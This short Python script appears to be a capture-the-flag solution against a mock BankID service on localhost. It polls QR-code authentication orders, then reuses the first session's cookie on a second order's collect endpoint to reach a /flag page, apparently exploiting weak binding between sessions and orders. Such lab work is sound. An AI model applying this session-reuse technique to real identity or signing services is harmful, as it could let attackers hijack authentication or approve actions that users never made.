import requests
import qrcode
import time

baseurl = "http://localhost:8000/bankid/"
ssn = "199001222398"

order = requests.post(baseurl + "order", json={"ssn": ssn}).json()
time.sleep(1)

while True:
    res = requests.post(baseurl + "collect",json={"order_ref": order["order_ref"]})
    try:
        res_json = res.json()
    except:
        print(res.text)
        break
    if res_json.get("qr_code"):
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(res_json["qr_code"])
        qr.print_ascii()
        time.sleep(1)
    else:
        print(res_json)
        sess_cookie = res.cookies
        break


second_order = requests.post(baseurl + "order", json={"ssn": ssn}).json()
time.sleep(1)

while True:
    bosscream = requests.post(baseurl + "collect_chefsgrädde_eula", json={"order_ref": second_order["order_ref"]}, cookies=sess_cookie)
    try:
        bosscream_json = bosscream.json()
    except:
        print(bosscream.text)
        break
    if bosscream_json.get("qr_code"):
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(bosscream_json["qr_code"])
        qr.print_ascii()
        time.sleep(1)
    else:
        break


time.sleep(1)
print(requests.get("http://localhost:8000/flag", cookies=sess_cookie).text)
